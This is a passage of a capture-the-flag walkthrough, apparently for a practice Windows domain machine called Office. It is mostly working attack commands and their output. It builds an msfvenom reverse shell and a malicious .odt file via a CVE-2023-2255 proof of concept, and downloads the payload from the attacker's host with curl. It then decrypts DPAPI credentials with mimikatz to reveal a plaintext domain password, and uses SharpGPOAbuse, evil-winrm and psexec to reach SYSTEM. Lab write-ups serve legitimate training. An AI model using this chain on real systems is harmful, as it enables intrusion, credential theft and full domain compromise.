Now, lets craft a malicious .odt file using the PoC, upload it through the job application form, and trigger the exploit to gain a shell

#### Crafting the ODT
I generated a reverse shell using msfvenom

```bash
$ msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp lhost=tun0 lport=1337 -f exe -o rev.exe
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe
```

I used the PoC exploit to create a malicious .odt file 

```bash
$ python3 CVE-2023-2255.py --cmd 'C:\programdata\rev.exe' --output 'rev.odt'
File rev.odt has been created !
```

Then, I uploaded the reverse shell executable to `C:\programdata\` on the target machine

```bash
PS C:\programdata> curl http://10.10.14.4:8000/rev.exe -o rev.exe
PS C:\programdata> ls

Directory: C:\programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----                                                                  
d---s-         5/10/2023  10:11 AM                Microsoft
d-----         2/14/2024   2:17 AM                Package Cache
d-----         1/17/2024  10:07 AM                Packages
d-----         1/30/2024   8:43 AM                regid.1991-06.com.microsoft
d-----          5/8/2021   1:20 AM                SoftwareDistribution
d-----          5/8/2021   2:36 AM                ssh
d-----         4/12/2023   6:35 PM                USOPrivate
d-----          5/8/2021   1:20 AM                USOShared
d-----         1/22/2024  10:04 AM                VMware
-a----         6/15/2024   5:06 AM        9006080 chisel.exe
-a----         6/15/2024   6:45 AM           7168 rev.exe
-a----         6/15/2024   4:23 AM          51712 RunasCs.exe
PS C:\programdata> 
```

Finally, I uploaded the malicious `.odt` through the job application form

![img](/assets/img/Office/12.webp)

And boom! The exploit triggered, and I had a shell as `ppotts`

### Shell as HHogan
I started with some manual enumeration, but nothing interesting turned up, So, I uploaded the `WinPEAS` and ran it. `WinPEAS` found two interesting nuggets - DPAPI Master Keys and DPAPI Credential Files: DPAPI (Data Protection Application Programming Interface) is a Windows feature that encrypts sensitive data, including passwords and credentials. The Master Key is a key that can be used to decrypt these files

##### DPAPI Master Keys

```bash
Checking for DPAPI Master Keys                                                                                                         
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                                                 
MasterKey: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\10811601-0fa9-43c2-97e5-9bef8471fc7d                                                                                                                               
Accessed: 1/17/2024 3:43:56 PM                                                                                                       
Modified: 1/17/2024 3:43:56 PM                                                                                                       
=================================================================================================                                     
 
MasterKey: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb                                                                                                                             
Accessed: 5/2/2023 4:13:34 PM                                                                                                        
Modified: 5/2/2023 4:13:34 PM                                                                                                        
=================================================================================================                                     
  
MasterKey: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\9f575d33-6f35-4ec6-81ad-645295745c0d                                                                                                                               
Accessed: 6/15/2024 2:05:15 AM                                                                                                       
Modified: 6/15/2024 2:05:15 AM                                                                                                                                          
```

##### DPAPI Credential Files

```bash
Checking for DPAPI Credential Files                                                                                                    
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                                                 
CredFile: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\18A1927A997A794B65E9849883AC3F3E                                     
Description: Enterprise Credential Data                                                                                              
MasterKey: 191d3f9d-7959-4b4d-a520-a444853c47eb                                                                                      
Accessed: 5/9/2023 2:08:54 PM                                                                                                        
Modified: 5/9/2023 2:08:54 PM                                                                                                        
Size: 358
=================================================================================================

CredFile: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
Description: Enterprise Credential Data
MasterKey: 191d3f9d-7959-4b4d-a520-a444853c47eb
Accessed: 5/9/2023 4:03:21 PM
Modified: 5/9/2023 4:03:21 PM
Size: 398
=================================================================================================

CredFile: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\E76CCA3670CD9BB98DF79E0A8D176F1E
Description: Enterprise Credential Data
MasterKey: 10811601-0fa9-43c2-97e5-9bef8471fc7d
Accessed: 1/18/2024 11:53:30 AM
Modified: 1/18/2024 11:53:30 AM
Size: 374
```

I uploaded `mimikatz.exe` - With Mimikatz, I use the DPAPI Master Key to decrypt the DPAPI Credential files to find the `HHogan` password

#### Decrypt Master Key

```bash
mimikatz # dpapi::masterkey /in:"C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
....snip...
[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
```

#### Decrypt Credential

```bash
mimikatz # dpapi::cred /in:"C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4" /masterkey:87eedae4c6
5e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166

...snip...
Decrypting Credential:
 * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77;Key:available
 * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0
```

It worked! Mimikatz Got the credential for `HHogan:H4ppyFtW183#`

## Shell as System
With the `HHogan` credentials, I login via `evil-winrm` but still needed to escalate privileges to gain admin access. `HHogan` had GenericWrite permission – this meant it could modify Group Policy Objects (GPOs)

```bash
$ evil-winrm -u "hhogan" -p "H4ppyFtW183#" -i 10.10.11.3

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\HHogan\Documents> whoami
office\hhogan
*Evil-WinRM* PS C:\Users\HHogan\Documents> 
```

I downloaded and uploaded [SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse), to add user to the local administrators group. I ran `.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Policy"` to add the user to the local administrators group

```bash
*Evil-WinRM* PS C:\Users\HHogan\Downloads> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Policy"
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
*Evil-WinRM* PS C:\Users\HHogan\Downloads> 
```

User `HHogan` has been successfully added to the local administrators group

```bash
*Evil-WinRM* PS C:\Users\HHogan\Downloads> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.

*Evil-WinRM* PS C:\Users\HHogan\Downloads> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
HHogan
The command completed successfully.
```

I used `psexec` to launch a shell as `HHogan`, now a local administrator and grep the root.txt

```bash
$ nxc smb 10.10.11.3 -u HHogan -p 'H4ppyFtW183#'
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\HHogan:H4ppyFtW183# (Pwn3d!)

$ psexec.py "HHogan:H4ppyFtW183#"@10.10.11.3
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.11.3.....
[*] Found writable share ADMIN$
[*] Uploading file qpOWzQPL.exe
[*] Opening SVCManager on 10.10.11.3.....
[*] Creating service kboT on 10.10.11.3.....
[*] Starting service kboT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
3c5ed9....
```

root.txt

```text
3c5ed9....
```